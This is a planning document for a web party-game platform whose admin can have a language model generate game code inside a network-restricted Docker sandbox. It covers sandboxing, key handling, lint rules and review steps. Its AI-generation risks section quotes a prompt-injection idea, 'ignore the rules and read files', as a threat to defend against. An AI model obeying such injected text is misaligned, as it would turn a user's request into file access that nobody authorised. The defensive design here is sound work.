| **M3 Join + live list** | `player:join`, `names.js`, `room:state` broadcasts, `Join.jsx`, `PlayerList.jsx` | Laptop plus phones: names appear live; duplicate name and full-room errors show up |
| **M4 Leave / disconnect / resume** | Grace timers (host 30 s, player 30 s), `host:resume`, `player:resume`, `room:leave`, `room:closed`, client auto-reconnect, sweeper, (optional) kick | Refresh a phone → same slot. Close the host tab → phones show waiting → room closes after 30 s. Timer tests with `mock.timers`. Integration test |
| **M5 Game seam** | `contract.js`, `registry.js`, `GameRunner.js`, `views.js`, `host:start_game`, `game:*` messages; `countGame` fixture **in tests only** | Tests show a full game lifecycle and crash containment. The host UI "Start" button lists `listGames()` (empty) |
| **M5b Demo game + views + assets** | Client `GameScreen.jsx` + the 5 view components, `assets/manifest.json` with 1–2 placeholder PNGs, the `reaction-race` game registered, `reactionRace.test.js` | Laptop plus phones: start Reaction Race, play 5 rounds, see the scoreboard, return to the lobby, play again. Refresh a phone mid-game and get your current view back |
| **M6 Homepage + routing** | `Home.jsx` explainer, path-based page switch, a join link with `?code=` prefill | Visit `/` → read the explainer → click Join or Host |
| **M6b Settings + dark mode** | A settings page/panel (`/settings` or a gear menu on every page). _(Built as a ⚙ panel on every page, not a separate page, so phones mid-game don't navigate away and drop their connection. Code in `client/src/settings/`.)_ The full list of settings is TBD; **dark mode is the one confirmed setting.** Theme options: Light / Dark / Match device (`prefers-color-scheme`). Refactor `styles.css` colors into CSS custom properties (`--bg`, `--text`, `--accent`, ...) with a `[data-theme="dark"]` override, so a theme is just a different set of variables. Preferences saved in `localStorage` (per device, survives closing the tab, unlike the room tokens in sessionStorage). Must cover the host big screen, phones, and game views. | Toggle dark mode; it applies instantly on every page and is remembered after a reload. A browser test for the toggle and persistence |
| **M7 Accounts + SQLite** | better-sqlite3, schema, scrypt, sessions, cookie, `/api/*` auth routes, `Login.jsx`; WS upgrade reads the cookie and checks Origin; `/host` requires login | Sign up, log in, host; logged out → redirected to login. Auth tests |
| **A0–A7 AI game generation** | Added 2026-10-13; built **before M8**. See §11d for the milestone list | See §11d |
| **K1–K6 Game dev kit (contract v3)** | Added 2026-10-14; built **before M8**. See §12h | See §12h |
| **M8 Deploy** | `npm run build`, Express serves `client/dist`, one node process under systemd (or pm2), Caddy reverse proxy for automatic HTTPS → `wss://` | The site works over HTTPS on a VPS, with phones on mobile data. _Note: where generation runs once deployed is Q10 (§11f)_ |

---

## 9. Decision list (★ = still yours to make, ✅ = decided)

| # | Decision | Options and tradeoffs | Recommendation |
|---|---|---|---|
| D1 | Language | JS+JSDoc (no build, easy) vs TS (compiler enforces the contract; more tooling) | **JS+JSDoc**, as you chose. TS can come later, file by file, if the contract grows |
| D2 | Repo layout | Two folders with their own package.json + root scripts, vs npm workspaces, vs one package | **Two folders + root scripts.** Simplest mental model: server and client are separate programs |
| D3 | State sync | Full snapshots vs deltas | **Snapshots.** Tiny at 12 players, and they self-heal after reconnects |
| D4 | WS attach | `new WebSocketServer({server})` vs `{noServer:true}` + manual `server.on('upgrade')` | **noServer + upgrade handler.** It's one place to check Origin and cookies before accepting (needed in M7) |
| D5 ✅ | Where the client keeps the resume token | `sessionStorage` (survives refresh, per tab, gone when the tab closes) vs `localStorage` (survives closing the tab; shared across tabs) | **Decided: sessionStorage.** |
| D6 ✅ | Player grace period | Same 30 s everywhere vs 30 s in the lobby and "keep until the game ends" in-game | **Decided: 30 s lobby, keep in-game.** |
| D7 ✅ | Late join during a game | Refuse vs allow as a spectator vs allow into the game | **Decided: refuse.** Spectators may come later: they would be a third role next to host and player that only receives broadcasts, so they fit without a lobby rewrite |
| D8 ✅ | Game contract style | **(a)** a ctx + callbacks object (above) vs **(b)** a pure reducer `(state, action) → {state, effects}` | **Decided: (a).** |
| D9 | Minigames | Same contract as games vs a separate, smaller contract | **Same contract.** One target for AI generation |
| D10 | Validation | Hand-written checks vs a schema library (zod/ajv, new deps) | **Hand-written.** ~8 message types; every check is visible and explainable |
| D11 | Test runner | `node:test` vs vitest/jest | **node:test.** Built in, zero deps, has mock timers |
| D12 ✅ | Client routing | Hand-rolled `pathname` switch vs `react-router` (new dep) | **Decided: hand-rolled.** |
| D13 ✅ | Database | better-sqlite3 vs `node:sqlite` (built in) vs **non-SQLite:** PostgreSQL (a separate server to install, back up and secure; worth it with many servers or heavy concurrent writes, neither of which we have) vs a JSON file (no dependency, but you'd reinvent locking and uniqueness, and a crash mid-write corrupts it) vs a hosted DB like Supabase (an external account and the network on every login) | **Decided: better-sqlite3.** On a single VPS, SQLite is one file next to the app, with nothing extra to run, and it handles far more traffic than a club will produce. Keep all SQL inside `server/src/db/` so a later move to Postgres touches only that folder |
| D14 | Login sessions | DB-backed random session id in an httpOnly cookie vs JWT | **DB sessions.** Logout and revoke actually work, and they're easy to explain. Store `sha256(sessionId)` in the DB, not the raw id |
| D15 | Password hashing | `crypto.scrypt` (built in) vs bcrypt/argon2 (deps) | **scrypt** with a 16-byte salt and `timingSafeEqual`. Passwords 8–128 characters, a generic "invalid username or password" error, and a simple per-IP login attempt limit |
| D16 | CSRF | SameSite=Lax cookie + require `Content-Type: application/json` on POST vs CSRF tokens | **SameSite=Lax + JSON-only POSTs** for MVP. Explain why: browsers can't send cross-site JSON POSTs without a CORS preflight, which we don't allow |
| D17 ✅ | Hosting | VPS (Hetzner/DigitalOcean/Lightsail/EC2) + Caddy vs serverless (Lambda / API Gateway WS) | **Decided: a single VPS + Caddy.** |
| D18 | Scaling | One process vs multiple + Redis/sticky sessions | **One process.** Easily handles hundreds of rooms. Revisit only if you actually need more |
| D19 ✅ | Host kick button in MVP | Include vs defer | **Decided: include (M4).** |
| D20 | Room code alphabet | All 26 letters vs a curated set | **20 letters `BCDFGHJKLMNPQRSTVWXZ`** (no vowels, no Y). Avoids accidental words and confusing letters; 20⁴ = 160k codes |
| D21 ✅ | Profanity filter for names | None vs a small blocklist vs host kick only | **Decided: host kick only.** |

---

## 10. Open questions and risks

**Resolved (round 2):** Q1 → declarative views (§4a). Q2 → Reaction Race demo + asset library (§4b–c, M5b). Q3 → no email. Q4 → one room per host, re-attach (§6). Q5 → URL and code as text.

**Still open:**
- **Q9 (added 2026-10-11): settings.** There should eventually be a settings area (M6b). Dark mode is the only confirmed setting so far; the rest is TBD. Candidates to decide later: sound on/off, reduced motion, text size for the big screen, default game options for hosts. Open sub-question: once accounts exist (M7), should a host's settings sync to their account (needs a DB column) or stay per device? Recommendation: per device (localStorage) first; sync only if hosts ask for it.
- **Q6: how the board game drives minigames.** Before the board game is built, we have to decide what `ctx.runMinigame` looks like, and whether minigame results feed straight into board moves or coins.
- **Q7: art format conventions:** sprite sizes, transparent backgrounds, a naming scheme for asset ids. Agree these once your first drawings or Blender renders exist, so the manifest stays consistent.
- **Q8: account features without email:** if a host forgets their password, the only option is an admin resetting it from the server. Is that acceptable for a club?

**Risks:**
- **Mobile sockets drop often** (screen lock, network switches). Reconnect + resume is core, not polish, which is why it's its own milestone (M4).
- **Server restarts lose every room.** Acceptable now. Deploys should happen when no one is playing.
- **better-sqlite3 is a native module.** Install can fail on some VPS images without build tools. Test the install early on the target box.
- **Sandboxing untrusted JS in Node is hard**, and easy to get wrong in ways that look like they work (`vm`). Treat E2 as a research milestone of its own, with a mentor review.
- **The host's login cookie is sent with the WebSocket upgrade,** so Origin checking (M7) is required, not optional.
- **Timing fairness in minigames** (latency differs per phone). Reaction Race uses server arrival order, so a phone on worse Wi-Fi is slightly disadvantaged. Fine for a demo. Real reaction minigames may need latency compensation later.
- **The view list can drift** between `server/src/games/views.js` and the client components, since there are two copies with no shared package. Mitigation: one test in M5b checks that every server view kind has a matching client component file.

---

## 11. AI game generation (decided 2026-10-13)

### 11a. The big picture

```
 Admin (/admin page)                Our server                         OpenShell sandbox (Docker)
 ───────────────────                ──────────                         ─────────────────────────
 types a game idea  ──POST──▶  saves a job in the DB (status: generating)
                               starts the sandbox via the `openshell` CLI ──▶  generator loop (Node):
                                                                                 1. build prompt (spec + examples + art list + idea)
                                                                                 2. ask GenAI Studio for game code ──▶ genai.rcac.purdue.edu
                                                                                 3. run the checks + harness ON the new code
                                                                                 4. failed? send the errors back, try again (max ~4)
                               downloads game.js + report.json  ◀──────────────  writes them to /output
                               saves them in the DB (status: review)
 reads code + report  ◀─────  
 [Playtest] → only the admin's rooms can pick it (code now runs on the server)
 [Publish]  → every host can pick it ("AI-made" badge)      [Reject] / [Delete]
```

**Why the sandbox matters here:** step 3 *runs freshly generated code that nobody has read yet.* That's the dangerous moment, so it happens inside OpenShell, not on the server or your laptop. The sandbox can't read your files, and its network is limited to GenAI Studio and nothing else. Generated code runs on our server only **after** you've read it and clicked Playtest.

**How the API key stays secret:** OpenShell *providers* keep the real GenAI Studio key in OpenShell's credential store. The sandbox only ever sees a placeholder, and OpenShell's proxy swaps in the real key only on requests to `genai.rcac.purdue.edu`. So even malicious generated code running in step 3 can't read or leak the key. Our server never holds the key either: you register it with OpenShell once, by hand (A0).

**Why our own small generator loop instead of a full coding agent (OpenCode, Claude Code, …):**
- The job is narrow: produce exactly one file that passes our checks.
- A ~150-line loop (prompt → code → check → fix) is predictable, testable, explainable to your mentor, and needs no new dependency (plain `fetch`).
- It works with any OpenAI-compatible model, including smaller ones that aren't good at tool use.

A general coding agent stays an option (OpenShell supports OpenCode) if the loop turns out too weak.

### 11b. Contract v2 (option C)

Changes from today's contract (§4), all made in A1:

| Change | Why |
|---|---|
| `contractVersion: 2` required on every GameModule | Future contract changes can be rolled out without breaking stored games |
| ~~GameInstance gains required `hostView()` and `playerView(playerId)`~~ **Changed 2026-10-13 (user chose the simpler option):** the runner remembers the last view sent to each player and to the host, and **resends it automatically on reconnect** | Games write nothing for reconnects, so generated games can't get it wrong. The same memory powers the offered-actions check below. `onPlayerReconnect`/`onHostReconnect` stay as optional hooks (called before the resend) |
| `ctx.now()`: server time in ms | `countdown.endsAt` needs it; today a game would have to break rule 4 and use `Date.now()` |
| `endGame({ rankings, scores? })`: `scores` is an optional `{playerId: number}` | Lets games show/record points and express ties (equal scores). Board-game minigames will need this (Q6) |
| **Offered-actions check** in `GameRunner`: an action is passed to the game only if it deep-equals one of the actions in the latest `button`/`choice` view sent to that player | Forged or stale actions are dropped by the platform for every game. Games still validate against their state (rule 5), but the easy mistakes are covered. _Re-check when a free-input view (e.g. text entry) is added: those views need a different rule_ |

**Unchanged:**
- Everything still runs in-process and synchronously, with the same 7 rules.
- Game state is still private to the game. Saving and resuming is out of scope for this version.

### 11c. Pieces and where they live

| Piece | Location | Notes |
|---|---|---|
| **Harness** (E4) | `server/src/games/harness/` + `npm run check-game <file>` | Shared by the sandbox, our tests, and a re-check when a stored game is loaded. **Bots** pick random *offered* actions, plus some junk actions, disconnects and reconnects, over many seeds with a virtual clock. **Checks:** loads with no imports; `validateGameModule`; every view valid; every asset id in the manifest; ends within 30 simulated minutes; never gets stuck waiting with no timer; never throws; host and every player get a view; no call over 100 ms; no more than 60 views from one action/timer. _(As built in A2; the hostView/playerView check was dropped with that part of contract C.)_ Each game runs in a child process with a wall-clock timeout, so an infinite loop is reported instead of hanging the harness |
| **Static lint** | inside the harness | Rejects `import`, `require`, `eval`, `Function`, `globalThis`, `process`, `async`, `await`, `Date`, `Math.random`. **Not a security boundary** (that's the sandbox plus your review). It catches rule-breaking code early, with clear messages to feed back to the model |
| **Generator** | `generator/` (top level): `run.js`, `prompt.js`, `llm.js`, `spec/GAME_SPEC.md`, `Dockerfile` | Runs only inside the sandbox. Reads the job from `/input/job.json`, writes `/output/game.js` and `/output/report.json` (attempts, check results, model name). Model calls go to GenAI Studio with plain `fetch`, at most ~5 per job, which stays under its 20 requests/min limit |
| **Sandbox image** | built from `generator/Dockerfile` (Node 24 slim + generator + harness + contract/views/runner + asset manifest + example games) | Files are built into the image, because OpenShell can't combine `--upload` with a main command. Rebuild it when the contract changes |
| **Example games** (the biggest lever on output quality) | `server/src/games/` (official, in the repo) | Reaction Race plus 1–2 new small hand-written games that use `choice` and `scoreboard` (e.g. a voting game), written in A4. They also stress-test contract v2 |
| **Admin role** | `users.is_admin` column + `npm run admin -- grant alpingold` script | Role in the DB, not a hard-coded username: the code holds no account names, and A7 needs roles anyway. Needs a small migration system (`PRAGMA user_version`), since `schema.sql` only creates tables |
| **Stored games** | new `generated_games` table: `id`, `owner_user_id`, `prompt`, `model`, `status` (generating / failed / review / playtest / published / rejected), `source` (TEXT), `source_sha256`, `report_json`, timestamps | Source lives in the DB, so it's backed up with the accounts. Ids are assigned by the server (`g-xxxxxx`), never chosen by the model |
| **Loading stored games** | registry: `register(mod, { source: 'official' \| 'generated', status, ownerId })` | Loaded with `import('data:text/javascript,…')`. This works because generated games have no imports, and needs no temp files. Re-checked with `validateGameModule` at startup; a broken one is marked failed and skipped, never crashes startup. `/api/games` filters by viewer: `published` for everyone, `playtest` only for the admin |
| **Job runner** | `server/src/generation/` (`jobs.js`, `openshell.js`, `fakeSandbox.js`) | One job at a time. `execFile('openshell', [...args])`: no shell, so a prompt can never become a command; the prompt goes in a file, never in argv. Sandbox created with `--cpu 1 --memory 1Gi`; the `exec` call has `--timeout`; the sandbox is always deleted afterwards. On server start, leftover `generating` jobs are marked failed. Tests use `fakeSandbox.js`, so `npm test` never needs Docker. Config flag `GENERATION_ENABLED`: off means the feature shows "not set up" |
| **Admin API** | `/api/admin/generations` (list, create), `/:id` (get), `/:id/playtest\|publish\|reject` (POST), `DELETE /:id` | `requireAdmin` middleware; same JSON-only POST rule as the auth routes (CSRF); prompt 10–1000 chars |
| **Admin page** | `client/src/pages/Admin.jsx` at `/admin` | Prompt form, job list with status (polls every 2 s; simpler than adding WS messages), report view, source shown as plain text in a `<pre>` (never run in the browser), action buttons. Host game picker shows an "AI-made" badge |
| **OpenShell setup** | `generator/openshell/genai-studio.yaml` (provider profile) + `generator/openshell/policy.yaml` + README steps | Network: only `genai.rcac.purdue.edu:443`, only from `node`. No npm registry: everything is in the image |

### 11d. Milestones (before M8)

| M | Goal | You can run / review |
|---|---|---|
| **A0 Spike: OpenShell + GenAI Studio by hand** ✅ _done 2026-10-13: Docker Engine 29.1 + OpenShell work on WSL2 (Ubuntu 26.04); all 5 spike checks pass. Gotcha: the default policy can't read `/app`, so always pass `--policy generator/openshell/policy.yaml`. **Models:** `gpt-oss:120b` default (~25 s/attempt); `qwen3.8:27b` the only alternative (generally better games, ~150 s/attempt). Setup steps live in `generator/README.md`_ | **No app code.** Install Docker Engine in WSL and OpenShell (WSL2 support is *experimental*, see risks). Create a GenAI Studio API key, write the custom provider profile, and start a throwaway sandbox that `curl`s `/api/models` through the provider. Confirm another host (e.g. example.com) is blocked and the key isn't visible in `env`. Pick the model (`gpt-oss:120b` is in the docs' example; check what your key can use). Write down the exact working commands | A sandbox that can reach GenAI Studio and nothing else. **Go/no-go gate:** if OpenShell won't run on WSL2, switch hosts (a Linux box or VPS) before building A4–A5 |
| **A1 Contract v2** ✅ _done 2026-10-13 (platform resends the latest view instead of required hostView/playerView; lobby shows ties from `scores`)_ | §11b: `contractVersion`, `hostView`/`playerView` + platform resend, `ctx.now()`, `scores`, offered-actions check. Migrate Reaction Race and `countGame`; update `contract.js` docs, tests and e2e | All tests green; Reaction Race plays the same; refreshing a phone mid-game still restores its view |
| **A2 Harness** ✅ _done 2026-10-13: `server/src/games/harness/` (lint, bot simulator on a VirtualClock with eager/sloppy/quiet scenarios, isolated worker with time + memory limits and Node's `--permission`), `npm run check-game`, 14 broken fixtures. Reaction Race passes all 18 runs. Also fixed: `server.close()` left 30 s grace timers running_ | Bots, checks, lint, child-process timeout, `npm run check-game`. Broken fixture games (infinite loop, never ends, bad view, unknown asset, forgets `playerView`) prove each check fires | `npm run check-game server/src/games/reaction-race/index.js` passes; each broken fixture fails with a clear message |
| **A3 Admin role + stored games** ✅ _done 2026-10-13: migrations with `PRAGMA user_version` + automatic `VACUUM INTO` backup of existing files; `is_admin`; `generated_games`; registry `source`/`status`/owner visibility; startup loader (re-checks fingerprint + contract, skips bad games); `npm run admin` (users, grant/revoke, games, import-game (harness-gated), set-status, delete-game). A startup loader, not hot reload: status changes via the script apply on restart (A6's API will update the registry live)_ | Migrations, `is_admin`, admin script, `generated_games` table, registry sources/statuses, `data:` URL loading, filtered `/api/games` | Grant yourself admin; insert a hand-written game into the DB; it appears in *your* picker only while in `playtest` |
| **A4 Generator** ✅ _done 2026-10-13: Majority Rules (2nd official/example game), `generator/` (spec, prompt, GenAI Studio client with retries, write→check→fix loop, allow-list Docker image), `server/src/generation/sandbox.js` (create → exec with job on stdin → delete), `npm run generate`. Model comparison below (§11g)_ | `GAME_SPEC.md`, 1–2 new official example games, prompt builder, LLM client, write→check→fix loop, Dockerfile. Run it by hand in OpenShell | `openshell` CLI run by hand → a `game.js` that passes the harness, plus its report |
| **A5 Job runner** ✅ _done 2026-10-13: `GenerationService` (one-at-a-time queue, max 5, progress steps, restart recovery, failed jobs keep their last attempt), admin API under `/api/admin/generations` (admin-only; playtest/publish/reject/delete applied to the running registry live, with fingerprint + load re-check), `GENERATION_ENABLED=1` switch, `--no-keep` safety net on sandboxes. Verified live: idea → real sandbox → review → playtest in ~30 s, no sandbox left behind_ | Server ↔ OpenShell wiring, job queue, DB statuses, fake sandbox for tests, `GENERATION_ENABLED` | A job started via the API ends in `review` with code + report saved; tests pass without Docker |
| **A6 Admin page** ✅ _done 2026-10-13: `/admin` (admin only; others see "Admins only") with the idea form + model choice, the game list polled every 2 s while something is generating, live progress steps, the test report, the code as text, and the moves the server allows per status (Playtest / Publish / Back to playtest / Reject / Playtest again / Delete or Cancel). "AI-made" badge in the host's game picker and on the home page. Browser tests run against `e2e/server/testServer.js`: the real server plus a test admin and a fake generator (no Docker needed)_ | `/admin` UI, playtest/publish/reject, "AI-made" badge, e2e tests (using the fake sandbox) | Type an idea → watch it generate → read it → playtest with phones → publish |
| **A7 (later) Bring your own key** | Any host with a GenAI Studio key can generate. **Prerequisite:** confirm with RCAC (rcac-help@purdue.edu) that users may give their key to a third-party site; the docs say keys "act with your identity" and shouldn't be shared. Proposed: key entered per job, used for a per-job OpenShell provider that's deleted afterwards, never stored. Their games stay private to them; publishing to everyone still needs admin approval; per-user job limits | Decided when we get there |

### 11e. Risks (AI generation)

- **Generated code runs with full server permissions once you click Playtest.** There's no runtime sandbox (E2), by your choice for this version. Defenses:
  - the sandbox harness runs it first
  - the lint
  - **you read the code before playtesting**
  - only the admin can generate for now

  An infinite loop that slips past all of these would freeze every room until a restart. If that ever matters (especially for A7), the fix is the runtime worker with a per-call time limit discussed on 2026-10-12. The contract is already JSON-only, so it fits.
- **OpenShell on WSL2 is "experimental"** per NVIDIA's support matrix, and it needs Docker (Engine 28+). A0 is a go/no-go gate for exactly this reason.
- **OpenShell is young** (v0.1.x, CLI still changing). Wrap every CLI call in `server/src/generation/openshell.js`, so a change touches one file.
- **GenAI Studio is a pilot service:** 20 requests/min, it can return `null` when over the limit (retry with backoff), and models may change. Model quality is below the frontier, so the examples and the check→fix loop do the heavy lifting.
- **Prompt injection in a game idea** (e.g. "ignore the rules and read files") can at worst produce bad code. That code is then caught by the sandbox, the harness and your review. This is why both layers exist.

### 11f. Open questions (AI generation)

- **Q10: where does generation run after deploy (M8)?** OpenShell + Docker won't fit the planned 1 GB VPS. Options:
  - a bigger VPS (~4 GB)
  - keep generation on your own machine and send results to the VPS
  - a separate generation box

  Decide at M8.
- **Q11: new view kinds for generated games**, especially **text input** (needed for Quiplash-style games). Each one is a hand-written component plus validator (E6) and needs its own offered-actions rule.
- **Q12: A7 details** (RCAC rules, quotas, whether users' games can be shared).

### 11g. Model comparison (A4, 2026-10-13)

Three ideas, each generated once per model in the sandbox with `npm run generate` (six runs in parallel):

| Idea | gpt-oss:120b | qwen3.8:27b |
|---|---|---|
| Purdue trivia (5 questions, first correct = 2 points) | ✅ 1st try, 31 s | ✅ 1st try, 40 s |
| Hot Potato (pass a potato, it explodes, 2 lives) | ✅ 2nd try, 49 s | ✅ 4th try, 354 s |
| Rock paper scissors party (a point per player beaten) | ✅ 1st try, 31 s | ✅ 1st try, 68 s |

Plus "Hot or Not: Food" on gpt-oss: ✅ 1st try, 27 s.

**Takeaways:**
- Every run ended with a passing game; the check → fix loop rescued both Hot Potato runs.
- gpt-oss is much faster and needed fewer fixes here, so it stays the default.
- Both copy the example games' structure closely, so the examples are the main lever on quality.
- **The tests can't check facts or game logic.** Both trivia games contained wrong or made-up "facts": qwen marked "Blue and Gold" as Purdue's colors and *The Daily Titan* as its newspaper. "Hot or Not" awarded a "minority" point when everyone voted the same way. Human review stays essential. For fact games, put the facts in the idea yourself.
- Sample size is tiny (one run per cell); revisit with more runs if the defaults ever matter more.

---

## 12. Game dev kit: contract v3 (decided 2026-10-14)

### 12a. Why, and the goal

**The problem.** After A6, AI-made games came out too simple. A drawing game and a reflex game couldn't be made at all. The cause is mostly the contract, not the model:
- **5 fixed screens:** message, button, choice, countdown and scoreboard.
- **No real player input:** no typing, drawing, sliders, multi-select or ranking.
- **No combining:** one screen kind at a time.
- **Every tap is a server round trip:** too slow for anything with timing.

**The goal: an AI dev kit first and foremost.** Games, whether hand-made or AI-made, standalone or small, get a toolbox:
- composable building blocks
- input blocks
- interactive widgets that react instantly on the phone

The kit has one written reference ("the tools"), which is used both in the AI prompt and on a public page. A game can be changed with follow-up prompts, and every change is kept as a version.

**Decided (2026-10-14):**
- Option 1 from the discussion: richer hand-written UI. Generated games still never run code in browsers.
- **Free HTML/JS from games is not built.** It would need a sandboxed iframe on a separate origin. Review would double, and the bots couldn't test the UI. Revisit only if the kit hits a wall.
- **No split** between standalone games and minigames for now. The Mario Party board with picked minigames (option 3) is a **future alternate game mode**, filterable in the catalogue (§12g).

### 12b. Screens are block trees

A game sends a **screen**: a small tree of blocks, still plain JSON, checked by the server and drawn by trusted React components.

```js
ctx.sendToPlayer(id, {
  view: 'screen',
  blocks: [
    { block: 'text', text: 'Round 2 of 5', size: 'small' },
    { block: 'timer', endsAt: ctx.now() + 20_000, style: 'bar' },
    { block: 'text', text: 'Draw: a cat on a skateboard', size: 'big' },
    { block: 'drawPad', action: { submit: 'drawing', round: 2 }, colors: ['black', 'red', 'blue'] },
  ],
});
```

**Rules:**
- **The 5 v2 view kinds are removed** (decided 2026-10-14: we're in development, so breaking games is fine). Their jobs move into blocks: `message` → `text` + `image`, `countdown` → `timer`, `button`/`choice`/`scoreboard` become blocks. Official games, test fixtures and the AI spec move to screens in K1. AI games already stored with v2 will fail their load check and be skipped at startup; delete or regenerate them.
- Limits keep screens sane and testable:
  - nesting at most 5 deep
  - at most 60 blocks per screen
  - text limits per block
  - a screen can be up to 256 KB, raised from 8 KB because drawings are shown on the big screen (96 KB in K3; 256 KB in K5, so a gallery of 12 full drawings fits)
- Styling uses fixed words only, never CSS: `size: small|normal|big|huge`, `tone: normal|muted|good|bad|accent`, `align`. Every screen stays readable and works in dark mode.

**The first set of blocks** (each one is a hand-written component plus its checks):

| Group | Blocks | Notes |
|---|---|---|
| Layout | `column`, `row`, `grid` (cols 2–6), `card` | Children are blocks |
| Display | `text`, `image` (asset id), `timer` (number or bar), `progress`, `scoreboard`, `playerName`, `drawing` (shows a submitted drawing), `divider` | `playerName` looks names up, so games never handle display names |
| Input (one round trip) | `button`, `choice` (single or `multi`, with min/max picks), `textInput` (maxLength ≤ 200), `slider` (min/max/step), `rank` (order 2–8 items) | Sends `{ action, input }` |
| Widgets (instant on the phone) | `reaction` (wait → GO at a server time → measures ms locally), `mash` (counts taps for N s), `timingBar` (stop the moving marker; sends 0–1000), `tapTargets` (targets appear at seeded spots; sends hits and ms), `drawPad` (strokes, sent on submit) | The phone does the fast part locally and sends one result |

A widget measures time on the phone. That's fair to people on slow Wi-Fi, but a modified phone could fake a result. That's fine for a party game; the platform still rejects impossible values, like a reaction under 80 ms.

### 12c. Input and actions (protocol + contract v3)

- **Action messages.** `game:action` becomes `{ action, input? }`.
  - `action` must still match an action offered on that player's current screen (the offered-actions check now walks the block tree).
  - `input` is checked **by the platform** against that block's rules: text length, slider range, choice count, rank permutation, drawing size, widget result shape and bounds.
  - Games receive `onAction(playerId, action, input)` and can trust the input's shape. They still check it against game state.
- **Drawing format.** Strokes are `[[color, [x,y, x,y, …]], …]`, with integer coordinates 0–1000 and a hard cap of about 24 KB. The WebSocket frame limit rises from 4 KB to 32 KB, still rate-limited.
- **`contractVersion: 3`** is required from K1 on (screens). v2 games are no longer accepted. K2–K3 add to v3 without another bump while we're in development.
- **Bots.** Each block definition includes a way for bots to produce random valid input (words for text, scribbles for drawings, random reaction times, …). The harness plays every block automatically, and new blocks are tested for free.

### 12d. One definition per block → checks, bots, docs

Each block is defined once in `server/src/games/kit/`:
- its fields, described with a tiny hand-written schema (about 100 lines, no new dependency)
- a one-line purpose and an example
- an input checker
- a bot input maker

The following are **generated from those definitions**, so they can't drift apart:
1. The server's screen and input checks.
2. **`KIT.md`, the tools reference.** It goes into the AI prompt, replacing the hand-written view list in `GAME_SPEC.md`.
3. A public **`/kit` page.** Every block is shown live with its example, so you can tap, type and draw on it, together with its fields and a copyable JSON example. It's the dev kit's documentation and the place to see what's possible.

The client components stay hand-written. The existing sync test is extended so that every block needs a component and a `/kit` example.

### 12e. Changing a game with more prompts (versions)

- **Data.** A new `game_versions` table, added by a migration: `game_id, version, request (the idea or change request), model, source, source_sha256, report_json, status (generating/failed/ready), error, created_at`.
  - `generated_games` keeps the stable game id, its name, its status (review/playtest/published/rejected), and which version is live (`live_version`).
  - Existing games become version 1.
- **Asking for changes.** The admin page gets an "Ask for changes" box on any game, for example: "rounds are too long; add a drawing round; show the scoreboard after each round". The job runs in the same sandbox and loop. Its prompt includes:
  - the kit
  - the examples
  - the original idea
  - **the current code**
  - the change request

  The model returns the whole new file plus a short changelog, and the usual check → fix loop runs.
- **Nothing changes for players until you choose.** A new version waits in review. "Playtest v3" or "Publish v3" swaps it in live, after the fingerprint and load re-check. Rolling back means playtesting an older version.
- **Admin page.** A version history (request, changelog, test result, which version is live). Code is still shown as text. A simple "changed lines" view (a small hand-written line diff, no dependency) makes reviewing a change faster than rereading the whole file.

### 12f. Better examples (the biggest lever, again)

**Official example games, rewritten or added on v3:**
- **Reaction Race** moves to the `reaction` widget, so reaction times are fair.
- A new **drawing game**, "Sketch & Guess": one player draws, others type guesses.
- A new **text game**: write answers, vote for the funniest.

**Acceptance ideas for generation:** your **drawing game** and **reflex game** ideas, plus a few others. They're re-run on both models, and the results go in a table like §11g.

### 12g. Later (not in K1–K6)

- **Party mode / minigames (option 3).** A hand-written board game that runs picked games as minigames (`ctx.runMinigame`, Q6). Games declare an optional `tags` field (e.g. `minigame`, `drawing`, `reflex`) so the catalogue can filter by mode.
- **Editing code by hand** on the admin page (a new version, re-tested in the sandbox before review).
- **More widgets:** tilt/shake (iOS asks permission for motion sensors), sounds, a "hold" button, a word picker.
- **Free-form client code** in a cross-origin sandboxed iframe, only if the kit proves too limiting (see 12a). _Being explored on branch `iframe-games`: §13._

### 12h. Milestones (before M8)

| M | Goal | You can run / review |
|---|---|---|
| **K1 Screens + layout/display blocks** ✅ _done 2026-10-14: `server/src/games/kit/` (schema helper, 13 block definitions, screen checks with exact error paths, player-id check, generated block reference in the AI prompt); `contractVersion: 3`; the 5 views are gone; Reaction Race and Majority Rules rebuilt from blocks (timer bar, answer breakdown bars, cards); client renderer in `client/src/game/blocks/`; big and huge text are headings; the big screen uses the full TV width during games. The kit reference (part of K4) was pulled forward so the generator works on v3 right away. Stored v2 AI games no longer load: delete or regenerate them_ | Kit folder and schema helper; screens replace the 5 views (`contractVersion: 3`); layout and display blocks, plus `button` and single `choice` as blocks; recursive client renderer with fixed styling words; size and depth limits; official games, fixtures, harness and AI spec moved to screens; sync test | A hand-written test game shows a combined screen (title + timer bar + scoreboard) on phones and the big screen |
| **K2 Input blocks + contract v3** ✅ _done 2026-10-14: `textInput`, `multiChoice` (a separate block, not a `multi` flag on `choice`: clearer for the AI, since a multi-pick sends one action plus the ticked indexes), `slider`, `rank`; `game:action { action, input }`; each block's `input.read` checks and cleans the value (trim + NFC, no control characters, snapped slider steps, sorted picks) before `onAction(id, action, input)`; buttons and choices must send no input; bots fill every input block with valid values, and the sloppy scenario also sends real actions with junk values, which must never reach the game. The 32 KB frame limit moves to K3, where drawings need it: the K2 inputs fit in 4 KB_ | `{ action, input }` protocol; platform input checks; `onAction(id, action, input)`; offered-actions check over block trees; `textInput`, multi `choice`, `slider`, `rank`; bots make inputs; frame limit to 32 KB | Type, slide and rank on a phone; the game gets checked input; bad input is dropped |
| **K3 Widgets** ✅ _done 2026-10-14: `reaction` (goAt; phone measures ms; `{ early: true }` for false starts; rejected if it arrives before GO on the server clock), `mash`, `timingBar`, `tapTargets` (seeded spots, same on every phone), `drawPad` + `drawing` (strokes on a 1000 × 750 canvas, palette names, ≤ 1500 points ≈ 10–15 KB, white paper in dark mode too). Widgets have their own `widget` group in the reference. Limits: client frames 32 KB, screens 96 KB (galleries of drawings; the plan said 64). Input checks now get the arrival time (`context.now`)_ | `reaction`, `mash`, `timingBar`, `tapTargets`, `drawPad` + `drawing`; local timing with the clock offset; bounds checks; bot inputs | Each widget playable on a phone; drawings show on the big screen |
